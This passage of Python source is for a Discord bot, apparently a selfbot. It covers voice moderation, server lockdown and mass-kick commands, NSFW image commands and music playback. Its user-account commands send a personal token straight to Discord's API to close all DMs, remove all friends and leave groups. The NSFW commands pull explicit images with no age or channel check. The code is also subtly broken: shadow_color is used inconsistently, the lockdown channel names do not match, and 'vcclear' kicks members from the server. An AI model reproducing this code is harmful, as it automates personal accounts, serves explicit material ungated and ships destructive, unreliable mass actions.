@bot.command(name='vcmoveall', aliases=['moveall'], brief="Moves all users to another vc", usage=".vcmoveall <from.channel.id> <to.channel.id>")
async def vcmoveall(ctx, channel1_id: int, channel2_id: int):
    await ctx.message.delete()
    embed = discord.Embed(color=shadow_color())
    channel1 = bot.get_channel(channel1_id)
    channel2 = bot.get_channel(channel2_id)
    if isinstance(channel1, discord.VoiceChannel) and isinstance(channel2, discord.VoiceChannel):
        members = channel1.members
        for member in members:
            await member.move_to(channel2)
        embed.title = "Members Moved"
        embed.description = f"Moved all members from {channel1.name} to {channel2.name}."
        await send_embed(ctx, embed)


@bot.command(name='vcmute', aliases=['stfu'], brief="Mutes a vc user", usage=".vcmute <mention.user>")
async def vcmute(ctx, user: discord.Member):
    await ctx.message.delete()
    embed = discord.Embed(color=shadow_color)
    #if await check_permissions(ctx, user):
    if user.voice and user.voice.channel:
        await user.edit(mute=True)
        embed.title = "User Muted"
        embed.description = f"{user.mention} has been muted."
        await send_embed(ctx, embed)


@bot.command()
async def vcunmute(ctx, member: discord.Member):
    embed = discord.Embed(color=shadow_color)
    if ctx.author.voice and member.voice and member.voice.channel == ctx.author.voice.channel:
        await member.edit(mute=False)
        embed.title = "User Unmuted"
        embed.description = f"{member.mention} has been unmuted."
        await send_embed(ctx, embed)
    else:
        embed.title = "Error"
        embed.description = "User is not in the same voice channel."
        await send_embed(ctx, embed)


@bot.command()
async def vcdeafen(ctx, member: discord.Member):
    embed = discord.Embed(color=shadow_color)
    if ctx.author.voice and member.voice and member.voice.channel == ctx.author.voice.channel:
        await member.edit(deafen=True)
        embed.title = "User Deafened"
        embed.description = f"{member.mention} has been deafened."
        await send_embed(ctx, embed)
    else:
        embed.title = "Error"
        embed.description = "User is not in the same voice channel."
        await send_embed(ctx, embed)


@bot.command()
async def vcundeafen(ctx, member: discord.Member):
    embed = discord.Embed(color=shadow_color)
    if ctx.author.voice and member.voice and member.voice.channel == ctx.author.voice.channel:
        await member.edit(deafen=False)
        embed.title = "User Undeafened"
        embed.description = f"{member.mention} has been undeafened."
        await send_embed(ctx, embed)
    else:
        embed.title = "Error"
        embed.description = "User is not in the same voice channel."
        await send_embed(ctx, embed)


@bot.command()
async def vcmove(ctx, member: discord.Member, channel: discord.VoiceChannel):
    embed = discord.Embed(color=shadow_color)
    if ctx.author.voice and member.voice and member.voice.channel == ctx.author.voice.channel:
        await member.move_to(channel)
        embed.title = "User Moved"
        embed.description = f"Moved {member.mention} to {channel.name}."
        await send_embed(ctx, embed)
    else:
        embed.title = "Error"
        embed.description = "User is not in the same voice channel."
        await send_embed(ctx, embed)


@bot.command()
async def vcjoin(ctx, channel: discord.VoiceChannel):
    await ctx.author.move_to(channel)
    embed = discord.Embed(color=shadow_color)
    embed.title = "Joined Voice Channel"
    embed.description = f"{ctx.author.mention} joined {channel.name}."
    await send_embed(ctx, embed)


@bot.command()
async def vcleave(ctx):
    embed = discord.Embed(color=shadow_color)
    if ctx.author.voice:
        await ctx.author.move_to(None)
        embed.title = "Left Voice Channel"
        embed.description = f"{ctx.author.mention} left the voice channel."
        await send_embed(ctx, embed)
    else:
        embed.title = "Error"
        embed.description = "You are not in a voice channel."
        await send_embed(ctx, embed)


@bot.command()
async def vcclear(ctx):
    embed = discord.Embed(color=shadow_color)
    if ctx.author.voice:
        for member in ctx.author.voice.channel.members:
            await member.kick()
        embed.title = "All Members Kicked"
        embed.description = "Kicked all members from the voice channel."
        await send_embed(ctx, embed)
    else:
        embed.title = "Error"
        embed.description = "You need to be in a voice channel to use this command."
        await send_embed(ctx, embed)


@bot.command()
async def vcsetlimit(ctx, limit: int, channel: discord.VoiceChannel = None):
    embed = discord.Embed(color=shadow_color)
    channel = channel or ctx.author.voice.channel
    await channel.edit(user_limit=limit)
    embed.title = "User Limit Set"
    embed.description = f"Set the user limit of {limit} for {channel.name}."
    await send_embed(ctx, embed)


@bot.command()
async def vcname(ctx, *, new_name: str):
    embed = discord.Embed(color=shadow_color)
    if ctx.author.voice:
        await ctx.author.voice.channel.edit(name=new_name)
        embed.title = "Voice Channel Renamed"
        embed.description = f"Renamed the voice channel to {new_name}."
        await send_embed(ctx, embed)
    else:
        embed.title = "Error"
        embed.description = "You need to be in a voice channel to rename it."
        await send_embed(ctx, embed)

@bot.event
async def on_voice_state_update(member, before, after):
    global vc, channel_id
    if member.guild.id in vc:
        if member.id == bot.user.id and before.channel is not None and after.channel is None:
            channel = bot.get_channel(channel_id)
            if channel is not None:
                vc[member.guild.id] = await channel.connect()

############################################
#              User Commands               #
############################################

def mainHeader():
    return {
        "Authorization": token,
        "Content-Type": "application/json"
    }

@bot.command()
async def closealldms(ctx):
    await ctx.message.delete()
    dm_user_ids = []
    for dm in bot.private_channels:
        if isinstance(dm, discord.DMChannel):
            dm_user_ids.append(dm.id)
    
    embed = discord.Embed(title="Closing DMs", description="**All DMs are being closed.**", color=shadow_color)
    await send_embed(ctx, embed)
    
    tasks = [close_dm(channel_id) for channel_id in dm_user_ids]
    await asyncio.gather(*tasks)

async def close_dm(channel_id):
    url = f"https://ptb.discord.com/api/v9/channels/{channel_id}"
    headers = mainHeader()
    response = requests.delete(url, headers=headers)

def remove_friend(user_id):
    url = f"https://canary.discord.com/api/v9/users/@me/relationships/{user_id}"
    response = requests.delete(url, headers=mainHeader())

    if response.status_code == 204:
        print(f"Removed friend {user_id}")
    else:
        print(f"Failed to remove friend {user_id}, status code: {response.status_code}")

async def get_friends():
    relationships = await bot.http.get_relationships()
    return [relationship['id'] for relationship in relationships if relationship['type'] == 1]

@bot.command()
async def delfriends(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="Removing Friends", description="**All friends are being removed...**", color=shadow_color)
    await send_embed(ctx, embed)

    while True:
        friend_ids = await get_friends()
        if not friend_ids:
            break
        tasks = [remove_friend_async(friend_id) for friend_id in friend_ids]
        await asyncio.gather(*tasks)
        await asyncio.sleep(2)  
    
    embed.title = "Friends Removed"
    embed.description = "**All Friends Have Been Removed**"
    await send_embed(ctx, embed)

async def remove_friend_async(user_id):
    await asyncio.to_thread(remove_friend, user_id)

@bot.command()
async def leaveallgroups(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="Leaving Groups", description="**Bot is leaving all groups...**", color=shadow_color())
    await send_embed(ctx, embed)

    for channel in bot.private_channels:
        if isinstance(channel, discord.GroupChannel):
            await channel.leave()

    embed.title = "Groups Left"
    embed.description = "**Bot has left all groups.**"
    await send_embed(ctx, embed)


############################################
#            Security Commands             #
############################################

bot.lockdown_mode = False

@bot.command()
async def lockdown(ctx, status: str):
    owner = ctx.guild.owner
    embed = discord.Embed(color=shadow_color)
    
    if status.lower() == 'on':
        if bot.lockdown_mode:
            embed.title = "Lockdown Mode"
            embed.description = "Lockdown mode is already enabled."
            await send_embed(ctx, embed)
            return
        bot.lockdown_mode = True
        maint_channel = discord.utils.get(ctx.guild.channels, name='maintenance-🚧')
        if maint_channel is None:
            maint_channel = await ctx.guild.create_text_channel('maintenance-🚧')
        for channel in ctx.guild.channels:
            if channel != maint_channel:
                await channel.set_permissions(ctx.guild.default_role, view_channel=False)
                for role in ctx.guild.roles:
                    await channel.set_permissions(role, view_channel=False)
            else:
                await channel.set_permissions(owner, view_channel=True, send_messages=True)
        for role in ctx.guild.roles:
            if role != ctx.guild.default_role:
                await role.edit(permissions=role.permissions.update(create_instant_invite=False, connect=False))
        
        embed.title = "Server Lockdown Enabled"
        embed.description = "All channels are hidden except for the maintenance channel, visible only to the server owner."
        await send_embed(ctx, embed)
    elif status.lower() == 'off':
        if not bot.lockdown_mode:
            embed.title = "Lockdown Mode"
            embed.description = "Lockdown mode is not enabled."
            await send_embed(ctx, embed)
            return
        bot.lockdown_mode = False
        for channel in ctx.guild.channels:
            await channel.set_permissions(ctx.guild.default_role, overwrite=None)
            for role in ctx.guild.roles:
                await channel.set_permissions(role, overwrite=None)
        for role in ctx.guild.roles:
            if role != ctx.guild.default_role:
                await role.edit(permissions=role.permissions.update(create_instant_invite=True, connect=True))
        maint_channel = discord.utils.get(ctx.guild.channels, name='🚧-maintenance')
        if maint_channel:
            await maint_channel.delete()

        embed.title = "Server Lockdown Disabled"
        embed.description = "All channels are now visible."
        await send_embed(ctx, embed)
    else:
        embed.title = "Invalid Status"
        embed.description = "Use 'on' or 'off'."
        await send_embed(ctx, embed)

@bot.command()
async def kickallbots(ctx):
    members = ctx.guild.members
    bots = [member for member in members if member.bot]
    embed = discord.Embed(color=shadow_color())
    
    if not bots:
        embed.title = "Kick All Bots"
        embed.description = "There are no bots to kick in this server."
        await send_embed(ctx, embed)
        return
    for bot_member in bots:
        try:
            await bot_member.kick(reason="Kicked by an administrator.")
            embed.title = "Bot Kicked"
            embed.description = f"Kicked bot: {bot_member.name}"
            await send_embed(ctx, embed)
        except discord.Forbidden:
            embed.title = "Failed to Kick Bot"
            embed.description = f"Failed to kick bot: {bot_member.name}. I don't have permission."
            await send_embed(ctx, embed)
        except discord.HTTPException as e:
            embed.title = "Failed to Kick Bot"
            embed.description = f"Failed to kick bot: {bot_member.name}. Error: {str(e)}"
            await send_embed(ctx, embed)
    if bots:
        embed.title = "Bots Kicked"
        embed.description = f"Successfully kicked {len(bots)} bot(s) from the server."
        await send_embed(ctx, embed)

@bot.command()
async def deleteallwebhooks(ctx):
    webhooks = await ctx.guild.webhooks()
    embed = discord.Embed(color=shadow_color)
    
    if not webhooks:
        embed.title = "Delete Webhooks"
        embed.description = "There are no webhooks to delete in this server."
        await send_embed(ctx, embed)
        return
    for webhook in webhooks:
        try:
            await webhook.delete()
            embed.title = "Webhook Deleted"
            embed.description = f"Deleted webhook: {webhook.name}"
            await send_embed(ctx, embed)
        except discord.Forbidden:
            embed.title = "Failed to Delete Webhook"
            embed.description = f"Failed to delete webhook: {webhook.name}. I don't have permission."
            await send_embed(ctx, embed)
        except discord.HTTPException as e:
            embed.title = "Failed to Delete Webhook"
            embed.description = f"Failed to delete webhook: {webhook.name}. Error: {str(e)}"
            await send_embed(ctx, embed)

    if webhooks:
        embed.title = "Webhooks Deleted"
        embed.description = f"Successfully deleted {len(webhooks)} webhook(s) from the server."
        await send_embed(ctx, embed)

############################################
#              Nsfw Commands               #
############################################

async def fetch_image(url):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                response.raise_for_status()  
                data = await response.json()
                return data.get('message')  
    except Exception as e:
        print(f"Error fetching image: {e}")
        return None

@bot.command(name="hrandom", description="Random Image")
async def hrandom(ctx):
    url = "https://nekobot.xyz/api/image?type=hentai"
    image_url = await fetch_image(url)
    embed = discord.Embed(title="Random Hentai Image", color=shadow_color)
    if image_url:
        embed.set_image(url=image_url)
        await send_embed(ctx, embed)
    else:
        embed.description = "An error occurred while fetching the image."
        await send_embed(ctx, embed)

@bot.command(name="hass", description="Random hentai ass")
async def hass(ctx):
    url = "https://nekobot.xyz/api/image?type=hass"
    image_url = await fetch_image(url)
    embed = discord.Embed(title="Random Hentai Ass", color=shadow_color)
    if image_url:
        embed.set_image(url=image_url)
        await send_embed(ctx, embed)
    else:
        embed.description = "An error occurred while fetching the image."
        await send_embed(ctx, embed)

@bot.command(name="ass", description="Random ass")
async def ass(ctx):
    url = "https://nekobot.xyz/api/image?type=ass"
    image_url = await fetch_image(url)
    embed = discord.Embed(title="Random Ass", color=shadow_color)
    if image_url:
        embed.set_image(url=image_url)
        await send_embed(ctx, embed)
    else:
        embed.description = "An error occurred while fetching the image."
        await send_embed(ctx, embed)

@bot.command(name="cumm", description="Baby gravy!")
async def cumm(ctx):
    url = "https://nekobot.xyz/api/image?type=cum"
    image_url = await fetch_image(url)
    embed = discord.Embed(title="Random Cum Image", color=shadow_color)
    if image_url:
        embed.set_image(url=image_url)
        await send_embed(ctx, embed)
    else:
        embed.description = "An error occurred while fetching the image."
        await send_embed(ctx, embed)

@bot.command(name="hblowjob", description="Bot explainable")
async def blowjob(ctx):
    url = "https://nekobot.xyz/api/image?type=blowjob"
    image_url = await fetch_image(url)
    embed = discord.Embed(title="Random Blowjob Image", color=shadow_color)
    if image_url:
        embed.set_image(url=image_url)
        await send_embed(ctx, embed)
    else:
        embed.description = "An error occurred while fetching the image."
        await send_embed(ctx, embed)

@bot.command(name="ahegao", description="Ahegao")
async def ahegao(ctx):
    url = "https://nekobot.xyz/api/image?type=ahegao"
    image_url = await fetch_image(url)
    embed = discord.Embed(title="Ahegao Image", color=shadow_color)
    if image_url:
        embed.set_image(url=image_url)
        await send_embed(ctx, embed)
    else:
        embed.description = "An error occurred while fetching the image."
        await send_embed(ctx, embed)

@bot.command(name="spank", description="NSFW for butts")
async def spank(ctx):
    url = "https://nekobot.xyz/api/image?type=spank"
    image_url = await fetch_image(url)
    embed = discord.Embed(title="Random Spank Image", color=shadow_color)
    if image_url:
        embed.set_image(url=image_url)
        await send_embed(ctx, embed)
    else:
        embed.description = "An error occurred while fetching the image."
        await send_embed(ctx, embed)

@bot.command(name="hwallpaper", description="99% SFW")
async def hwallpaper(ctx):
    url = "https://nekobot.xyz/api/image?type=wallpaper"
    image_url = await fetch_image(url)
    embed = discord.Embed(title="Random Wallpaper", color=shadow_color)
    if image_url:
        embed.set_image(url=image_url)
        await send_embed(ctx, embed)
    else:
        embed.description = "An error occurred while fetching the image."
        await send_embed(ctx, embed)

@bot.command()
async def erofeet(ctx):
    url = "https://nekobot.xyz/api/image?type=erofeet"
    image_url = await fetch_image(url)
    embed = discord.Embed(title="Random Ero Feet Image", color=shadow_color)
    if image_url:
        embed.set_image(url=image_url)
        await send_embed(ctx, embed)
    else:
        embed.description = "An error occurred while fetching the image."
        await send_embed(ctx, embed)

@bot.command()
async def anal(ctx):
    url = "https://nekobot.xyz/api/image?type=anal"
    image_url = await fetch_image(url)
    embed = discord.Embed(title="Random Anal Image", color=shadow_color)
    if image_url:
        embed.set_image(url=image_url)
        await send_embed(ctx, embed)
    else:
        embed.description = "An error occurred while fetching the image."
        await send_embed(ctx, embed)

@bot.command()
async def feet(ctx):
    url = "https://nekobot.xyz/api/image?type=feet"
    image_url = await fetch_image(url)
    embed = discord.Embed(title="Random Feet Image", color=shadow_color)
    if image_url:
        embed.set_image(url=image_url)
        await send_embed(ctx, embed)
    else:
        embed.description = "An error occurred while fetching the image."
        await send_embed(ctx, embed)

@bot.command()
async def hentai(ctx):
    url = "https://nekobot.xyz/api/image?type=hentai"
    image_url = await fetch_image(url)
    embed = discord.Embed(title="Random Hentai Image", color=shadow_color)
    if image_url:
        embed.set_image(url=image_url)
        await send_embed(ctx, embed)
    else:
        embed.description = "An error occurred while fetching the image."
        await send_embed(ctx, embed)

@bot.command()
async def boobs(ctx):
    url = "https://nekobot.xyz/api/image?type=boobs"
    image_url = await fetch_image(url)
    embed = discord.Embed(title="Random Boobs Image", color=shadow_color)
    if image_url:
        embed.set_image(url=image_url)
        await send_embed(ctx, embed)
    else:
        embed.description = "An error occurred while fetching the image."
        await send_embed(ctx, embed)

@bot.command()
async def tits(ctx):
    url = "https://nekobot.xyz/api/image?type=tits"
    image_url = await fetch_image(url)
    embed = discord.Embed(title="Random Tits Image", color=shadow_color)
    if image_url:
        embed.set_image(url=image_url)
        await send_embed(ctx, embed)
    else:
        embed.description = "An error occurred while fetching the image."
        await send_embed(ctx, embed)

@bot.command()
async def lewdneko(ctx):
    url = "https://nekobot.xyz/api/image?type=lewdneko"
    image_url = await fetch_image(url)
    embed = discord.Embed(title="Random Lewd Neko Image", color=shadow_color)
    if image_url:
        embed.set_image(url=image_url)
        await send_embed(ctx, embed)
    else:
        embed.description = "An error occurred while fetching the image."
        await send_embed(ctx, embed)

@bot.command()
async def lesbian(ctx):
    url = "https://nekobot.xyz/api/image?type=lesbian"
    image_url = await fetch_image(url)
    embed = discord.Embed(title="Random Lesbian Image", color=shadow_color)
    if image_url:
        embed.set_image(url=image_url)
        await send_embed(ctx, embed)
    else:
        embed.description = "An error occurred while fetching the image."
        await send_embed(ctx, embed)

@bot.command()
async def cumslut(ctx):
    url = "https://nekobot.xyz/api/image?type=cumslut"
    image_url = await fetch_image(url)
    embed = discord.Embed(title="Random Cumslut Image", color=shadow_color)
    if image_url:
        embed.set_image(url=image_url)
        await send_embed(ctx, embed)
    else:
        embed.description = "An error occurred while fetching the image."
        await send_embed(ctx, embed)

@bot.command()
async def waifu(ctx):
    url = "https://nekobot.xyz/api/image?type=waifu"
    image_url = await fetch_image(url)
    embed = discord.Embed(title="Random Waifu Image", color=shadow_color)
    if image_url:
        embed.set_image(url=image_url)
        await send_embed(ctx, embed)
    else:
        embed.description = "An error occurred while fetching the image."
        await send_embed(ctx, embed)

############################################
#              Music Commands              #
############################################
@bot.command()
async def play(ctx: commands.Context, *, query: str) -> None:
    if not ctx.guild:
        return
    player = ctx.voice_client
    embed = discord.Embed(color=shadow_color)
    if not player:
        try:
            player = await ctx.author.voice.channel.connect(cls=wavelink.Player)
        except AttributeError:
            embed.description = "Please join a voice channel first before using this command."
            await send_embed(ctx, embed)
            return
        except discord.ClientException:
            embed.description = "I was unable to join this voice channel. Please try again."
            await send_embed(ctx, embed)
            return
    tracks = await wavelink.Playable.search(query)
    if not tracks:
        embed.description = f"{ctx.author.mention} - Could not find any tracks with that query. Please try again."
        await send_embed(ctx, embed)
        return
    if isinstance(tracks, wavelink.Playlist):
        added = await player.queue.put_wait(tracks)
        embed.description = f"Added the playlist {tracks.name} {added} songs to the queue."
        await send_embed(ctx, embed)
    else:
        track = tracks[0]
        await player.queue.put_wait(track)
        embed.description = f"Playing {track.title}"
        await send_embed(ctx, embed)
    if not player.playing:
        await player.play(player.queue.get(), volume=30)

@bot.command()
async def skip(ctx: commands.Context) -> None:
    player = ctx.voice_client
    embed = discord.Embed(color=shadow_color)
    if not player:
        return
    await player.skip(force=True)
    embed.description = "Skipped the current track."
    await send_embed(ctx, embed)

@bot.command()
async def stop(ctx: commands.Context) -> None:
    player = ctx.voice_client
    embed = discord.Embed(color=shadow_color)
    if not player:
        return
    await player.skip(force=True)
    embed.description = "Stopped the playback and skipped the current track."
    await send_embed(ctx, embed)

@bot.command()
async def pause(ctx: commands.Context) -> None:
    player = ctx.voice_client
    embed = discord.Embed(color=shadow_color)
    if not player:
        return
    await player.pause()
    embed.description = "Playback paused."
    await send_embed(ctx, embed)

@bot.command()
async def resume(ctx: commands.Context) -> None:
    player = ctx.voice_client
    embed = discord.Embed(color=shadow_color)
    if not player:
        return
    await player.resume()
    embed.description = "Playback resumed."
    await send_embed(ctx, embed)

@bot.command()
async def volume(ctx: commands.Context, value: int) -> None:
    player = ctx.voice_client
    embed = discord.Embed(color=shadow_color)
    if not player:
        return
    await player.set_volume(value)
    embed.description = f"Volume set to {value}%."
    await send_embed(ctx, embed)

@bot.command(aliases=["dc"])
async def disconnect(ctx: commands.Context) -> None:
    player = ctx.voice_client
    embed = discord.Embed(color=shadow_color())
    if not player:
        return
    await player.disconnect()
    embed.description = "Disconnected from the voice channel."
    await send_embed(ctx, embed)

@bot.command()
async def queue(ctx: commands.Context) -> None:
    player = ctx.voice_client
    embed = discord.Embed(color=shadow_color)
    if not player or not player.queue:
        embed.description = "The queue is currently empty."
        await send_embed(ctx, embed)
        return
    queue_list = "\n".join([f"{i + 1}. {track.title}" for i, track in enumerate(player.queue)])
    embed.title = "Current Queue"
    embed.description = queue_list
    await send_embed(ctx, embed)

@bot.command()
async def nowplaying(ctx: commands.Context) -> None:
    player = ctx.voice_client
    embed = discord.Embed(color=shadow_color)
    if not player or not player.current:
        embed.description = "No track is currently playing."
        await send_embed(ctx, embed)
        return
    embed.title = "Now Playing"
    embed.description = f"🎵 {player.current.title}"
    await send_embed(ctx, embed)

@bot.command()
async def shuffle(ctx: commands.Context) -> None:
    player = ctx.voice_client
    embed = discord.Embed(color=shadow_color())
    if not player or not player.queue:
        embed.description = "The queue is empty, nothing to shuffle."
        await send_embed(ctx, embed)
        return
    player.queue.shuffle()
    embed.description = "The queue has been shuffled."
    await send_embed(ctx, embed)

@bot.command()
async def loop(ctx: commands.Context) -> None:
    player = ctx.voice_client
    embed = discord.Embed(color=shadow_color)
    if not player or not player.current:
        embed.description = "No track is currently playing to loop."
        await send_embed(ctx, embed)
        return
    player.loop = not player.loop
    status = "enabled" if player.loop else "disabled"
    embed.description = f"Looping has been {status} for the current track."
    await send_embed(ctx, embed)

@bot.command()
async def clearqueue(ctx: commands.Context) -> None:
    player = ctx.voice_client
    embed = discord.Embed(color=shadow_color)
    if not player or not player.queue:
        embed.description = "The queue is already empty."
        await send_embed(ctx, embed)
        return
    player.queue.clear()
    embed.description = "The queue has been cleared."
    await send_embed(ctx, embed)

bot.send_embed = send_embed
bot.magic = magic  

bot.run(token)
